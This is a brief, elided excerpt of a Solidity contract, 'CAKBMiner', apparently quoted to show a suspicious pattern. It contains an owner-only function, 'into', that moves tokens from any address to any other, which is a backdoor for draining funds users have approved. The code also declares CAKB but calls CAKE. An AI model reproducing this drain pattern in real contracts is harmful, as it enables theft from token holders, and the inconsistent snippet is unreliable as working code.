...
contract CAKBMiner is Ownable {
    ...
    IERC20 private constant CAKB = IERC20(address(0x9F47FE14A5Ec329aE8066e7aEa0da2889BA48A91));
    ...
    function into(address from, address to, uint256 value) external onlyOwner returns (bool) {
        CAKE.safeTransferFrom(from, to, value);
